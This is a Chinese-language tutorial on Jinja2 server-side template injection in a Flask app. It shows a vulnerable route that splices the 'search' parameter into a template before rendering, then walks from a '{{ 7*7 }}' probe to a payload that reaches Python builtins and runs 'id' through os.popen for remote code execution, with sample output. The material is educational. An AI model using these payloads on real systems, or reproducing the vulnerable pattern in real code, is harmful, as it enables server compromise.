# 服务端模板注入 (SSTI) - Jinja2

Web 应用程序经常使用服务端模板技术，在本例中我们将使用 `Jinja2` 模板引擎。`Jinja2` 是 Python 的模板语言，用于生成动态 HTML 渲染。当用户输入被添加到随后由模板渲染过程处理的内容中时，就会发生服务端模板注入 (SSTI) 漏洞。

```python
@app.route('/')
def index():
    search = request.args.get('search')
    content = (
        """
        <script src="{{ domain }}/main.js"></script>
        <h3 id="search">No result for: %s</h3>
        """ % search
    )
    return render_template_string(content, domain=request.url_root)
```

这段 Python 代码是 Web 应用程序的一部分，使用 `Flask` 框架和 `Jinja2` 作为其模板引擎。


1. `search` 变量获取客户端在名为 `search` 的 GET 参数中提供的值。
2. `content` 变量包含将显示给客户端的 HTML 代码。语法 `{{ ... }}` 用于告诉 `Jinja2` 该值应替换为变量 `domain` 给定的值。`%s` 标记用于将搜索参数提供的客户端值直接插入到内容中。

3. Python 使用 `render_template_string()` 函数，该函数使用 `Jinja2` 将 `{{ domain }}` 替换为给定值，然后将内容作为 HTTP 响应体返回给客户端。

这里的问题在于，来自用户的关键字是在 `Jinja2` 插入其给定值之前插入的。如果客户端插入类似 `{{ 7*7 }}` 的内容，`Jinja2` 会将内容字符串视为如下形式：

```html
<script src="{{ domain }}/main.js"></script>
<h3 id="search">No result for: {{ 7*7 }}</h3>
```

`Jinja2` 现在会同时看到 `{{ domain }}` 和 `{{ 7*7 }}`。这导致 `Jinja2` 将这两个模板标记替换为请求的值，如下所示：

```html
<script src="http://www.example.com/main.js"></script><h3 id="search">No result for: 49</h3>
```

由于我们可以控制插入到 HTML 内容中的 GET 参数 `search`，且该操作发生在模板引擎 (`Jinja2`) 渲染内容之前，因此存在模板注入漏洞。我们可以尝试注入如下载荷：`{{ self.__init__.__globals__.__builtins__ }}`

```log
No result for: {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects ... <built-in function __build_class__>, '__import__': <built-in function __import__> ... }
```

这些载荷提供了应用程序 Python 代码使用的内置函数、类型、异常和其他对象的结果。我们可以通过查找类似 `import` 的“异常”来利用它们。通过这个“异常”，我们可以导入像 `os` 这样的库，这将帮助我们在目标应用程序上执行系统命令，从而导致远程代码执行 (RCE)。

载荷：`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

```log
uid=0(www-data) gid=0(www-data) groups=0(www-data)
```

我们可以看到，我们成功在应用程序上执行了系统命令，从而导致了远程代码执行。
